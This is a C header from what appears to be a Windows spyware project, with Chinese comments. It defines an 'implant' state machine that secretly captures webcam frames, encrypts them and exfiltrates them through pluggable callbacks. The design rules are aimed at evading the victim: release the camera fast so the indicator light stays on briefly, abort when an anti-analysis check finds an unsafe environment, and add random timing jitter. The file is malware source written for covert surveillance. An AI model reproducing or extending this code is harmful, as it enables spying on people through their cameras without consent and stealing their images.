/*
 * agent_windows/include/implant.h
 *
 * 植入体主循环（摄像头采集 → 打包 → 回传 的状态机）。
 *
 * 设计前提（与仓库已有模块的分工）：
 *   采集层   —— 复用 camera.h（后端可替换：Windows 真机 mf / 测试 mock）
 *   打包层   —— 由 pack 回调注入，真实部署接 20_packer
 *   回传层   —— 由 exfil 回调注入，真实部署接 21_exfil
 *   对抗层   —— 由 defend 回调注入，真实部署接 19_defense
 * 本模块不重复实现上述任何一层，只负责编排与状态管理。
 *
 * 三条硬规则：
 *   1. 未注入 pack 回调时，绝不回传明文 —— 直接 IMPLANT_ERR_PACK。
 *      宁可什么都不发，也不发未加密的帧。
 *   2. 采集到帧后必须尽快释放设备句柄（capture_ms 到点即释放），
 *      缩短摄像头指示灯点亮窗口。指示灯由固件控制，软件关不掉，
 *      只能缩短暴露时间。
 *   3. 对抗自检失败即拒绝运行（IMPLANT_ERR_DEFEND），不在不安全环境
 *      里留下采集痕迹。
 */
#ifndef DAYANJING_AGENT_WINDOWS_IMPLANT_H
#define DAYANJING_AGENT_WINDOWS_IMPLANT_H

#include "camera.h"

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

typedef enum {
    IMPLANT_OK = 0,
    IMPLANT_ERR_PARAM,
    IMPLANT_ERR_MEM,
    IMPLANT_ERR_NO_DEVICE,
    IMPLANT_ERR_NO_PERM,
    IMPLANT_ERR_OPEN,
    IMPLANT_ERR_CAPTURE,
    IMPLANT_ERR_CONVERT,
    IMPLANT_ERR_PACK,
    IMPLANT_ERR_EXFIL,
    IMPLANT_ERR_DEFEND,   /* 对抗自检判定环境不安全，拒绝运行 */
    IMPLANT_STOPPED
} implant_err_t;

typedef enum {
    ST_INIT = 0,
    ST_DEFEND,    /* 对抗自检 */
    ST_WAIT,      /* 等待下一批到期 */
    ST_CAPTURE,   /* 采集 */
    ST_CONVERT,   /* 转码 JPEG */
    ST_PACK,      /* 打包 */
    ST_EXFIL,     /* 回传 */
    ST_DONE,
    ST_FAIL
} implant_state_t;

/* 时间源（微秒）。注入式：不直接读系统时钟，便于测试推进时间。 */
typedef uint64_t (*implant_now_us_t)(void *ud);

/*
 * 打包回调：明文 in → 密文制品 out。
 * 成功返回 0 并写回 *out_len。容量不足返回负值。
 */
typedef int (*implant_pack_t)(const uint8_t *in, size_t in_len,
                              uint8_t *out, size_t *out_len, void *ud);

/* 回传回调：把制品送出去。成功返回 0。 */
typedef int (*implant_exfil_t)(const uint8_t *data, size_t len,
                               const char *name, void *ud);

/* 对抗自检：0 表示环境安全可运行，非 0 表示不安全。 */
typedef int (*implant_defend_t)(void *ud);

typedef struct {
    cam_config_t cam;             /* 采集配置（宽高/fps/采集窗口/帧数） */
    uint32_t     interval_ms;     /* 两批之间的基准间隔 */
    uint32_t     jitter_ms;       /* 间隔抖动上限，实际间隔 ∈ [interval, interval+jitter] */
    uint32_t     max_batches;     /* 最多跑几批，0 = 不限（由 stop() 终止） */
    uint32_t     frames_per_batch;/* 每批采集帧数，0 表示用 cam.max_frames */
    uint32_t     jpeg_quality;    /* JPEG 质量 1..100 */
    bool         stop_on_error;   /* true: 出错即停；false: 计错误后继续 */
    bool         run_defend;      /* 是否执行对抗自检（仅首批前执行） */
} implant_cfg_t;

typedef struct {
    implant_state_t state;
    uint32_t        batches_done;
    uint32_t        frames_total;
    uint64_t        bytes_total;   /* 回传的制品字节累计 */
    uint32_t        errors;
    implant_err_t   last_err;
    uint64_t        last_gap_ms;   /* 上一批实际等待时长（含抖动） */
} implant_stats_t;

typedef struct implant implant_t;

implant_t *implant_create(const implant_cfg_t *cfg, const char *backend);
void       implant_destroy(implant_t *im);

/* 钩子注入。未注入 pack 时 implant_step 会以 IMPLANT_ERR_PACK 拒绝。 */
void implant_set_now(implant_t *im, implant_now_us_t fn, void *ud);
void implant_set_pack(implant_t *im, implant_pack_t fn, void *ud);
void implant_set_exfil(implant_t *im, implant_exfil_t fn, void *ud);
void implant_set_defend(implant_t *im, implant_defend_t fn, void *ud);

/* 推进一步状态机。返回 IMPLANT_OK / IMPLANT_STOPPED / 具体错误码 */
implant_err_t implant_step(implant_t *im);

/* 跑到 DONE / FAIL / 被 stop 为止 */
implant_err_t implant_run(implant_t *im);

/* 请求停止：当前步结束后退出，不产生半批数据 */
void implant_stop(implant_t *im);

const implant_stats_t *implant_stats(const implant_t *im);
implant_state_t        implant_cur_state(const implant_t *im);
const char            *implant_errstr(implant_err_t e);
const char            *implant_state_name(implant_state_t s);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_AGENT_WINDOWS_IMPLANT_H */
